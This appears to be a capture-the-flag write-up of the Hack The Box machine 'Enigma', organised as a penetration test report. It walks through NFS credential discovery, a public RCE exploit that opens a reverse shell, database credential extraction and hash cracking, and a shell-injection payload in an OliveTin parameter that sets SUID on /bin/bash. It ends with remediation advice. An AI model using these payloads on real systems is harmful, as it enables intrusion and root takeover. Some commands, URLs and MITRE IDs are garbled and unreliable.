# Enigma — HTB Penetration Test Report

**Machine:** Enigma (Easy)  
**Completion:** No hints used  
**Attack Chain:** NFS enumeration → credential extraction → web RCE → database pivot → privilege escalation

---

## Executive Summary

Enigma is a business management system (OpenSTAManager) that was compromised through an unmounted NFS export, leading to credential discovery, web application exploitation via a known CVE, database credential extraction, hash cracking, and ultimately privilege escalation through an unsanitized database parameter in a locally-running web service.

**Root cause:** Overly permissive NFS export + unpatched business management application + inconsistent input sanitization in web services.

---

## Phase 1: Reconnaissance & Service Discovery

### Port Enumeration

```bash
nmap -sV -sC enigma.htb
```
![[image_27_0.png]]
![[image_27_1.png]]
**Open Ports:**
- 22 (ssh)
- 80 (http)
- 110 (pop3) — Dovecot mail server
- 111 (rpcbind) — RPC directory service
- 143 (imap) — Dovecot mail server
- 993 (ssl/imap)
- 995 (ssl/pop3)

### Service Analysis & Initial Strategy

The presence of **rpcbind on port 111** is the critical indicator. This is the RPC directory service—it advertises where RPC services are listening, by matching program numbers to ports their services listen on. 
Nmap output shows RPC running NFS (Network File System) on port 2049. Supporting services for NFS (mountd, nlockmgr, status, nfs_acl) are also run through RPC.

The pop3 is the post office protocol version 3; it allows clients to download emails from a remote server. Dovecot is the mail retrieval open-source server.

The imap is the internet message access protocol; it allows clients to manage emails from a remote server.

**Initial attack vector decision:** NFS mounts are easier to exploit than modern web applications. If `/etc/hosts` or configuration files exist on the NFS share, they often contain credentials or service paths that accelerate the attack.

### Parallel Web Reconnaissance 
While planning the NFS exploitation, I ran concurrent reconnaissance on the web application: 
**Subdomain Enumeration:** 
```bash
ffuf -u http://enigma.htb -H "Host: FUZZ.enigma.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -c -fw 4 
```
Results that contained 4 words were filtered out because they are noisy output.
![[image_28_7.png]]
**Result:** No valid subdomains found via brute force. 

**Directory Enumeration:** 
```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u http://enigma.htb/FUZZ -c
```

![[image_28_8.png]]
Result: Only `index.html` returned 200; web server is minimal with no admin panels or obvious entry points. 

**Insight:** Web application is hardened. NFS remains the primary vector.

---

## Phase 2: NFS Enumeration & Credential Discovery

### NFS Export Discovery

```bash
showmount -e enigma.htb
```

![[image_29_3.png]]

**Result:**
```
Export list for enigma.htb:
/onboarding  *
```

The `/onboarding` directory is world-readable (`*` means all clients can access it).

### NFS Mount & File Extraction

```bash
mkdir nfs
sudo mount -t nfs -o nolock enigma.htb:/srv/nfs/onboarding ./nfs
ls -la nfs/
```

![[image_29_5.png]]
Opening the PDF in firefox browser:
![[image_29_6.png]]

**Contents:** A PDF document containing **initial webmail credentials**:
- Username: `kevin`
- Password: Enigma2024!
- Subdomain: mail001.enigma.htb

---

## Phase 3: Web Reconnaissance & Credential Chaining

### Webmail Access (mail001.enigma.htb)
![[image_28_12.png]]
Identified the webmail subdomain from the discovered pdf shared through NFS. Logged in with Kevin's NFS-extracted credentials.

**Service identified:** Roundcube (confirmed via HTTP headers and UI fingerprinting)

```bash
curl -I http://mail001.enigma.htb
```
![[image_28_13.png]]
**Webmail version:** 1.6.16
This was identified in the website's help menu. (The ? icon)

RoundCube version 1.6.16 is a critical security update that patched 8 severe vulnerabilities. This update patched policy bypass flaws, pre-auth vulnerabilities, and XSS and injection vulnerabilities.
(source: https://roundcube.net/news/2026/05/24/security-updates-1.6.16-and-1.7.1)

In other words, this version is protected against the latest CVEs, thus we should pivot to another tactic to try and break through.

**Email discovered:** Sarah (colleague) sent an email to Kevin containing welcoming him to the team.
![[image_28_14.png]]
Now, we know that a user sarah exists on the system.

![[image_28_18.png]]
The email only confirms what we already have discovered: the existence of the shared PDF that contained Kevin's credentials.

#### Webmail (mail001.enigma.htb) Directory Enumeration
![[image_28_15.png]]

After identifying the webmail subdomain, attempted directory enumeration:

```bash
ffuf -u http://mail001.enigma.htb/FUZZ -w /usr/share/seclists/danielmiessler-Seclists-8a7c5da/Discovery/Web-Content/DirBuster-2007_directory_list-2.3-medium.txt -c -fw 366
```

**Results:**
- `skins/` — 301 redirect
- `plugins/` — 301 redirect  
- `program/` — 301 redirect

**Analysis:** All directories return 301 (moved permanently), indicating they exist but are not directly accessible via directory traversal. The Roundcube application structure is intentionally restrictive—directories redirect to the main application handler rather than exposing subdirectories.

**Implication:** Directory enumeration is not viable against Roundcube. 

#### Roundcube Plugin Vulnerability Research

**Plugin Discovery:**
Accessed the Roundcube About popup and identified installed plugins:
![[image_28_19.png]]

**Attack Vector Hypothesis:** Custom or third-party plugins often contain unreviewed code and are common sources of RCE vulnerabilities.

The plugins' source code is found in this github [link](https://github.com/roundcube/roundcubemail/tree/1.6.16).

**Vulnerability Analysis:**

Reviewed the plugin code for common attachment plugin vulnerabilities:
- **Arbitrary file write** — Could the plugin write files outside the attachment directory?
- **Path traversal** — Do file paths get properly sanitized before write operations?
- **File type validation** — Does the plugin enforce file type restrictions?
- **Execution context** — Can uploaded files be executed if written to web-accessible directories?

Leveraged Claude AI to perform detailed code review:
- Provided the plugin source code
- Asked Claude to identify potential security flaws
- Focused on input validation, file handling, and directory permissions

**Result:** All plugins implement proper:
- File path sanitization (no directory traversal possible)
- File type validation (restricts execution)
- Directory isolation (attachments stored outside web root)

**Conclusion:** Plugin is secure; no exploitable vulnerabilities found. Roundcube 1.6.16 is sufficiently patched against known plugin-based RCE vectors.

### Credential Reuse Attack — Contextual Analysis
After exhausting the Roundcube plugin vector, I reconsidered the credentials discovered earlier in the NFS `/onboarding` share. 

**Contextual Observation:** The NFS share was explicitly named `/onboarding`—indicating these are **company onboarding credentials**, not individual user passwords. 

Onboarding credentials are typically: 
- Distributed to all new employees during setup 
- Often left unchanged by users (low perceived sensitivity) 
- Commonly reused across multiple accounts during the first week of employment 

First, I tried using Kevin's credentials to login through SSH.
![[image_30_26.png]]
SSH only allowed public key authentication, so this attempt did not work.

**Attack Hypothesis:** Sarah is a colleague of Kevin's (evidenced by the email in Kevin's mailbox). If she's a relatively new employee or recently onboarded, she may not have changed her default onboarding password despite being assigned to a new account.
### IT Portal Discovery (support_001.enigma.htb)
```bash
openssl s_client -conntect enigma.htb:995 -quiet
```

![[image_28_20.png]]
Connected to the mail client on port 995 (pop3 over ssl). I tried the username `sarah` and the password from the PDF `Enigma2024!`, and I was able to login. Sarah's email inbox was accessed.

An email sent by IT support contained admin credentials to what seemed like the IT dashboard.

I logged in with the newly found credentials.
![[image_28_23.png]]
**Application identified:** OpenSTAManager (OSM) version 2.9.8  
**Purpose:** Business management system (invoicing, accounting, inventory, customer records, etc.)

**Directory enumeration attempt on IT portal:**
```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://support_001.enigma.htb/FUZZ
```
![[image_28_24.png]]
**Result:** All non-standard routes returned 301, when which i tried to reach the routes, the webpage returned 403 (forbidden by nginx). Framework is locked down; no obvious API endpoints exposed.

---

## Phase 4: Foothold — CVE Investigation & Exploitation

### OpenSTAManager CVE Research

OSM 2.9.8 is an older version of an obscure business management platform. Searched for known vulnerabilities.

**CVEs found:**
- CVE-2026-38751: Arbitrary file upload via module update (High severity)
- Multiple SQLi vulnerabilities in various endpoints

**CVE-2026-38751 Details:**
- Component: Module update functionality (`modules/aggiornamenti/upload_modules.php`)
- CVSS Score: 7.2
- Requires: Authenticated admin access (which we have)
- Impact: Remote code execution via malicious module upload
- Status: Affects versions ≤ 2.10; our version (2.9.8) is vulnerable

### Exploitation: CVE-2026-38751

Located public PoC on GitHub and cloned the exploit:

```bash
git clone https://github.com/https://github.com/bøySie7e/OpenSTAManager-RCE-Exp10it-CVE-2026-38751.git
cd OpenSTAManager-RCE-Exploit-CVE-2026-38751
cargo build --release
cd target/release
./OpenSTAManager-RCE-Exploit-CVE-2026-38751 --help
```

**Exploit execution:**
```bash
./OpenSTAManager-RCE-Exploit-CVE-2026-38751 \
  -u http://support_001.enigma.htb \
  -U admin \
  -P Ne3s4rtars78s \
  --lhost lhost \
  --lport lport
```
![[image_30_29.png]]

**Result:** Reverse shell received. User: `www-data`
![[image_30_30.png]]

---

## Phase 5: Lateral Movement — Database Pivot

### Configuration File Enumeration

Examined `.gitignore` to identify sensitive files:

```bash
cat .gitignore
```
![[image_31_32.png]]
![[image_31_33.png]]
**Files to investigate:**
- `config.inc.php` 
- `mysql_8_3.json` (database configuration)

### Database Credential Extraction

Inspected the application configuration:

```bash
cat config.inc.php
```
![[image_31_34.png]]
**Credentials found:**
- DB User: `brollin`
- DB Password: `Fri3nds@9099`
- DB Host: `127.0.0.1`
- DB Name: `openstamanager`

### Database Access & User Hash Extraction

```bash
mysql -h 127.0.0.1 -u brollin -p'Fri3nds@9099' openstamanager
```
![[image_31_36.png]]
![[image_31_37.png]]
```sql
SELECT * FROM zz_users;
```

**Results:**

| User | Hash |
|------|------|
| admin | `$2y$10$rTJVUNyGGKPlhw2cFdf5AeDHVMhnIChddcHx2XxVLMQS2KsuSz4Pu` |
| haris | `$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC` |

### Hash Cracking

Identified hashes as bcrypt (PHP `$2y$` prefix). Used hashcat with mode 3200:

```bash
hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt
```

**Result:**
- `haris` password: `bestfriends`
- `admin` password: (no match in rockyou.txt)

### User Flag

```bash
su haris
cd ~
cat user.txt
```
![[image_31_42.png]]
**Success:** User flag obtained.

---

## Phase 6: Privilege Escalation — OliveTin Exploitation

### SSH Switch
Before moving on with PE, I decided to login to the user `haris` through ssh by creating a key pair and adding the public key to `.ssh/authorized_keys` file.
```bash
ssh-keygen -t ed25519 -f ~/.ssh/enigma_htb -N ""
```
![[image_32_51.png]]
This creates a public and private key pair with **no password** (-N "") in files `enigma_htb.pub` and `enigma.htb` respectively.
![[image_32_52.png]]
The `.ssh` directory was created and given `rwx` permissions. The public key was pasted in the `authorized_keys` file, which was given `rw` permissions. Both permissions are for the owner (haris) only.
```bash
ssh -i ~/.ssh/enigma_htb haris@enigma.htb
```
Thus, we gained access through ssh for better terminal visuals and control.
### Scheduled Tasks/ Cron Jobs 
```bash
systemctl list-timers --all
```
![[image_32_43.png]]
Enumerating the scheduled tasks returned no result that could be taken advantage of.
### Process Discovery

Enumerated running processes for privilege escalation vectors:

```bash
ss -tulpn
```
![[image_32_44.png]]
![[image_32_45.png]]
- **Root privilege** (PID/Program shows root): Service executes with root privileges 
- **Non-standard port** (1337): Custom application, not a default system service

### Service Identification
```bash
nc enigma.htb 1337
```
![[image_32_46.png]]
Fingerprinting the service using netcat, we discovered that the service is running HTTP.

```bash
curl http://localhost:1337
```

**HTML response metadata:**
![[image_32_47.png]]
```html
<meta name="description" content="Give safe and simple access to predefined shell commands from a web interface." />
```

**Service:** OliveTin v3k.10.0 — a simple web interface for executing predefined shell commands

**Risk:** Running as root with predefined commands = potential for privilege escalation if commands can be manipulated.

### Configuration Analysis

```bash
cat /etc/OliveTin/config.yaml
```
![[image_32_48.png]]
![[image_32_49.png]]
**Configuration reveals:**
- Command definitions with parameters
- No authentication required to execute commands

### Attack Vector #1: Direct Command Injection (host parameter)

The ping command structure:
![[image_32_57.png]]
```yaml
command: "ping {host} -c {count}"
```

**Injection attempt:**
```bash
curl -X POST http://localhost:1337/api/run-action \
  -d '{"host": "; whoami #"}'
```

**Result:** Failed. Input is sanitized; special characters are filtered or escaped.

**Analysis:** The `host` parameter accepts only alphanumeric characters + periods (valid for hostnames).

### Attack Vector #2: Create Custom Backup Script
![[image_32_58.png]]
Since the backup command references a script at `/opt/backup.sh`, attempted to write our own:

```bash
ls -la /
```

**Result:** Failed. User `haris` cannot write to `/opt` (permission denied).

### Attack Vector #3: Modify OliveTin Config

Attempted to edit the config file to define a new command:

```bash
sudo nano /etc/OliveTin/config.yaml
```

**Result:** Failed. User `haris` cannot run `sudo` nor can it write to the config file.

### Attack Vector #4: Database Parameter Injection (SUCCESS)

![[image_32_62.png]]

```yaml
command: "mysqldump -u root -p{db_pass} ..."
```

**Key insight:** The `db_pass` parameter is of type `password`. Passwords can contain special characters. Unlike the `host` parameter (limited to hostnames), this field is likely unfiltered.

**Exploitation approach:** Inject shell commands using backticks or `$()` syntax. Since the service is run by root, we can gain a root shell through `SUID bit injection`.

**Payload for SUID bit injection:**
![[image_32_63.png]]
```bash
db_pass: "; chmod +s /bin/bash; echo"
```
The ";" separates the mysqldump command and allows the chmod command to execute.

When OliveTin executes the backup command as root:
```bash
mysqldump -u root -p$(chmod +s /bin/bash) ...
```

The `$(chmod +s /bin/bash)` gets executed first, setting the SUID bit on bash while running as root.

**Execution:**
![[image_32_64.png]]
**Result:** Success. The SUID bit was set on `/bin/bash`.

### Final Root Access

```bash
bash -p
id
cat /root/root.txt
```
![[image_32_65.png]]
![[image_32_66.png]]
**Critical detail:** The `-p` flag is necessary. Bash has a safety feature: when it detects it's running as SUID (effective UID ≠ real UID), it drops the elevated privileges on startup for security reasons. The `-p` (privileged mode) flag tells bash to **retain** the elevated privileges instead of dropping them.

**Result:** Root shell obtained. Root flag captured.

---

## Vulnerability Chain Summary

```
Unmounted NFS Export
        ↓
    (kevin credentials)
        ↓
   Webmail Access
   (Discovered another user: sarah)
        ↓
	Credential reuse
		↓     
   (IT admin credentials via email)
        ↓
  OSM Admin Panel
        ↓
(CVE-2026-38751: file upload RCE)
        ↓
    www-data shell
        ↓
(database config in plaintext)
        ↓
    Database access
        ↓
(user hashes extracted & cracked)
        ↓
    SSH as haris
        ↓
(OliveTin runs as root with unsanitized db_pass parameter)
        ↓
(SUID bit injection via bash chmod)
        ↓
    Root shell
```

---
## MITRE ATT&CK Framework Mapping

This section maps the techniques used in this penetration test to the MITRE ATT&CK framework, which categorizes adversary tactics and techniques.

| Phase                | MITRE ATT&CK Technique                   | Technique ID | Description                                                                                   |
| -------------------- | ---------------------------------------- | ------------ | --------------------------------------------------------------------------------------------- |
| Reconnaissance       | Network Service Scanning                 | T1046        | Enumerated open ports via nmap to identify services (SSH, HTTP, POP3, IMAP, RPC, NFS)         |
| Reconnaissance       | Domain Subdomain Enumeration             | T1087.004    | Performed DNS subdomain brute force (ffuf)                                                    |
| Reconnaissance       | Web Content Discovery                    | T1590.004    | Directory enumeration via ffuf to identify accessible paths on web applications               |
| Initial Access       | Unsecured Credentials                    | T1552.001    | Discovered hardcoded credentials (kevin) in world-readable NFS export                         |
| Credential Access    | Brute Force - Credentials                | T1110.001    | Attempted credential reuse (kevin's password) against new user (sarah)                        |
| Credential Access    | Credentials from Web Browser             | T1187        | Accessed email inbox (Roundcube webmail) to discover admin credentials in email               |
| Credential Access    | Unsecured Credentials - Config Files     | T1552.007    | Extracted database credentials (brollin) from plaintext config: `config.inc.php`              |
| Credential Access    | Credential Stuffing                      | T1110.004    | Cracked bcrypt hashes (hashcat) to obtain plaintext passwords                                 |
| Execution            | Exploit Public-Facing Application        | T1190        | Exploited CVE-2026-38751 (arbitrary file upload) in OpenSTAManager to achieve RCE             |
| Execution            | Command and Scripting Interpreter - Bash | T1059.004    | Executed shell commands via reverse shell (www-data), hash cracking, and privilege escalation |
| Lateral Movement     | Remote Services - SSH                    | T1021.004    | Gained SSH access to haris user account using cracked credentials                             |
| Privilege Escalation | Abuse Elevation Control Mechanism - SUID | T1548.001    | Set SUID bit on /bin/bash via OliveTin parameter injection executed as root                   |
| Privilege Escalation | Unsecured Credentials - Config Files     | T1552.007    | Leveraged unencrypted database credentials to access system data and extract user hashes      |
| Defense Evasion      | Impersonation - User Account             | T1087.001    | Reused onboarding credentials across multiple user accounts (kevin → sarah)                   |

---
## Key Security Findings

### Critical Issues
#### 1. **Unmounted NFS Export** (CVSS 9.0 | T1552.001)
**Vulnerability:**
- `/onboarding` directory exported to all clients (`*`)
- Contains sensitive credentials in plaintext PDF
- No access controls or encryption
- Accessible without authentication

**Immediate Remediation:**

```bash
# /etc/exports
# BEFORE (vulnerable):
/onboarding *

# AFTER (secure):
/onboarding 192.168.1.0/24(ro,root_squash,no_all_squash)
```

- **Restrict to specific subnets** — Only allow access from known internal networks
- **Read-only mounting** (`ro`) — Prevents write/modification attacks
- **Root squashing** (`root_squash`) — Maps root user to nobody, preventing escalation via NFS
- **Disable all_squash** — Preserve user permissions for legitimate access

**Long-term Mitigations:**
- Implement **NFS Kerberos authentication** (RPCSEC_GSS) for encryption and authentication
- Remove sensitive data from shared directories; use centralized credential management (HashiCorp Vault, AWS Secrets Manager)
- Implement network segmentation to isolate NFS traffic (VLAN, firewall rules)
- Enable NFS access logging and monitoring; alert on unusual export changes
---
#### 2. **Plaintext Database Credentials in Config** (CVSS 8.0 | T1552.007)
**Vulnerability:**
- Database credentials hardcoded in `config/config.php`
- Accessible to any user with file read access
- Single set of credentials shared across all application instances
- No credential rotation mechanism

**Immediate Remediation:**
```php
// BEFORE (vulnerable):
define('DB_USER', 'brollin');
define('DB_PASS', 'Fri3nds@9099');

// AFTER (secure):
define('DB_USER', $_ENV['DB_USER']);
define('DB_PASS', $_ENV['DB_PASS']);
```

**Long-term Mitigations:**
- Implement **secrets management system** (HashiCorp Vault, AWS Secrets Manager)
- Use **least-privilege database accounts** with only necessary permissions (SELECT, INSERT, UPDATE; no DROP, ALTER)
- Implement **credential rotation** every 90 days
- Enable **database auditing** to log connection attempts and queries
- Use **encrypted connections** (SSL/TLS) for database access
---
#### 3. **Unpatched Application (OSM 2.9.8)** (CVSS 7.2 | T1190)
**Vulnerability:**
- CVE-2026-38751: Arbitrary file upload in module update functionality
- Affects versions ≤ 2.10 (current: 2.9.8)
- Requires admin authentication, but credentials were leaked via email
- No file type validation or upload restrictions

**Immediate Remediation:**

```bash
# Update to latest patched version
sudo apt update && sudo apt upgrade openstamanager
```

**Long-term Mitigations:**
- Subscribe to security mailing lists for OSM and dependent libraries
- Implement **automated patch management** using Dependabot/Renovate
- File upload restrictions with **file type validation** and **ZIP signature verification**
- Store uploads **outside web root** to prevent execution
- Implement **Web Application Firewall (WAF)** to detect suspicious file uploads
- Code signing for modules: Verify cryptographic signatures of all uploaded modules
---
#### 4. **Inconsistent Input Validation** (CVSS 7.5 | CWE-20)
**Vulnerability:**
- `host` parameter: Properly sanitized (alphanumeric + periods only)
- `db_pass` parameter: No sanitization (accepts special characters)
- Command construction uses string interpolation instead of parameterized queries
- Allows shell metacharacters (`;`, `$()`, `|`, `&`) to break out of intended context

**Immediate Remediation:**

```bash
# VULNERABLE: String interpolation
command = "mysqldump -u root -p{db_pass} database"

# SECURE: Use environment variables + escaping
mysqldump -u root --password="$DB_PASSWORD" database
```

**Long-term Mitigations:**
- **Parameterized/prepared statements** for all dynamic queries/commands
- **Input validation whitelist** for all parameters (whitelist approach, not blacklist)
- **Output encoding** to prevent injection (use proper shell escaping libraries)
- Web Application Firewall (WAF) to detect common injection patterns
- Code review process focusing on input validation consistency
---
#### 5. **OliveTin Running as Root** (CVSS 9.0 | T1548.001)
**Vulnerability:**
- Web service executes shell commands with root privileges
- No privilege separation or sandboxing
- User-controlled parameters passed directly to shell
- Any parameter injection = immediate root compromise

**Immediate Remediation:**
Create dedicated, unprivileged user:

```bash
# Create olivetinweb user with no shell access
sudo useradd -r -s /bin/false -m -d /var/lib/olivetinweb olivetinweb
# Update systemd service
# /etc/systemd/system/OliveTin.service
[Service]
User=olivetinweb
Group=olivetinweb
PrivateTmp=yes
NoNewPrivileges=yes
```

For commands requiring root, use `sudo` with specific, limited privileges (sudoers file):

```bash
# /etc/sudoers.d/olivetinweb
olivetinweb ALL=(root) NOPASSWD: /usr/bin/systemctl restart nginx
olivetinweb ALL=(root) NOPASSWD: /usr/local/bin/backup-database
```

**Long-term Mitigations:**
- **Privilege separation**: Split OliveTin into web UI (unprivileged) + privileged command executor (separate process)
- **Capabilities instead of SUID**: Use Linux capabilities to grant minimal required permissions
- **Containerization** with strict seccomp/AppArmor profiles
- **SELinux/AppArmor mandatory access control** to restrict actions OliveTin can perform
- Implement **principle of least privilege** architecture
---
## Additional Security Findings
### Medium Issues
- **Dovecot + Roundcube:** Credentials visible in plaintext email headers
- **Admin credentials in email:** IT support credentials leaked to employee mailbox instead of secure transmission channel
- **No MFA:** Single-factor authentication on admin accounts
- **Password policy:** No evidence of password complexity requirements or rotation
### Recommended Monitoring & Detection
- Enable **NFS access logging** and monitor for unusual exports
- Monitor **database for suspicious queries** from application user
- Alert on **file uploads to web directories**
- Monitor **SUID bit changes** on system binaries
- Alert on **OliveTin parameter injection attempts** (special characters in db_pass)
### Compliance & Standards Mapping

| Vulnerability | CWE | OWASP Top 10 | NIST CSF |
|--------------|-----|--------------|----------|
| NFS Export | CWE-732 | A01:2021 – Broken Access Control | AC-3 |
| Plaintext Credentials | CWE-798 | A02:2021 – Cryptographic Failures | SC-7 |
| Unpatched Software | CWE-1025 | A06:2021 – Vulnerable Components | SI-2 |
| Inconsistent Validation | CWE-20 | A03:2021 – Injection | SI-10 |
| Service as Root | CWE-250 | A01:2021 – Broken Access Control | AC-6 |